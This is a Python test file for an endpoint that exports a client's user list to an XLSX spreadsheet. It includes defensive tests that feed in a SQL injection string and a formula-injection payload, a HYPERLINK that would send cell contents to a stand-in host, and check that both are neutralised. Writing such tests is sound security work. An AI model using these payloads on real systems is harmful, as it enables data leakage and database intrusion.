from tests.conftest import AUTH, make_client_db, read_sheet

URL = "/api/v1/clients/acme/reports/users"

USERS = [
    {"id": 1, "name": "Ana Pérez", "login": "ana", "email": "ana@example.com", "phone": "+573001112233"},
    {"id": 2, "name": "Alberto Ruiz", "login": "Alberto", "email": "al@example.com"},
    {"id": 3, "name": "Beatriz Gómez", "login": "bea", "email": "bea@example.com"},
]


def test_all_users(client, env):
    make_client_db(env[1] / "acme.db", users=USERS)
    r = client.get(URL, params={"letra": "Todos"}, headers=AUTH)

    assert r.status_code == 200
    assert r.headers["content-type"].startswith("application/vnd.openxmlformats")
    assert r.headers["content-disposition"] == 'attachment; filename="reporte_usuarios_acme_todos.xlsx"'
    sheet = read_sheet(r.content)
    assert sheet.title == "Usuarios"
    rows = list(sheet.values)
    assert rows[0][:3] == ("ID Registro", "Nombre", "Login")
    assert [row[1] for row in rows[1:]] == ["Ana Pérez", "Alberto Ruiz", "Beatriz Gómez"]
    assert rows[1][7] == "+573001112233"  # los teléfonos con '+' no se alteran


def test_letter_filter_is_case_insensitive_on_any_engine(client, env):
    make_client_db(env[1] / "acme.db", users=USERS)
    rows = list(read_sheet(client.get(URL, params={"letra": "a"}, headers=AUTH).content).values)
    assert [row[2] for row in rows[1:]] == ["ana", "Alberto"]  # 'A' y 'a' en el login


def test_filter_value_is_not_interpreted_as_sql_wildcard(client, env):
    make_client_db(env[1] / "acme.db", users=USERS)
    for evil in ("%", "_", "A%", "' OR 1=1 --", "AB"):
        assert client.get(URL, params={"letra": evil}, headers=AUTH).status_code == 422


def test_empty_result_still_has_header(client, env):
    make_client_db(env[1] / "acme.db", users=USERS)
    rows = list(read_sheet(client.get(URL, params={"letra": "Z"}, headers=AUTH).content).values)
    assert len(rows) == 1 and rows[0][0] == "ID Registro"


def test_formula_injection_is_neutralized(client, env):
    """Un nombre de usuario malicioso no debe ejecutarse como fórmula al abrir el archivo."""
    evil = '=HYPERLINK("http://malo.example/?x="&A1,"clic")'
    make_client_db(env[1] / "acme.db", users=[{"id": 1, "name": evil, "login": "x", "email": "=1+1"}])
    sheet = read_sheet(client.get(URL, params={"letra": "Todos"}, headers=AUTH).content)  # modo normal
    name_cell, email_cell = sheet["B2"], sheet["F2"]
    assert name_cell.value == evil and name_cell.data_type == "s"  # texto, no 'f' (fórmula)
    assert email_cell.value == "=1+1" and email_cell.data_type == "s"


def test_control_characters_and_oversized_cells_do_not_break_the_export(client, env):
    make_client_db(env[1] / "acme.db", users=[{"id": 1, "name": "ab\x00c\x1fd", "login": "x", "email": "e" * 40_000}])
    r = client.get(URL, params={"letra": "Todos"}, headers=AUTH)
    assert r.status_code == 200
    row = list(read_sheet(r.content).values)[1]
    assert row[1] == "abcd"
    assert len(row[5]) == 32_767 and row[5].endswith("...")


def test_clients_are_isolated(client, env):
    make_client_db(env[1] / "acme.db", users=USERS)
    make_client_db(env[1] / "beta.db", users=[{"id": 9, "name": "Solo Beta", "login": "beta1"}])
    beta = list(read_sheet(client.get("/api/v1/clients/beta/reports/users", params={"letra": "Todos"}, headers=AUTH).content).values)
    assert [row[1] for row in beta[1:]] == ["Solo Beta"]
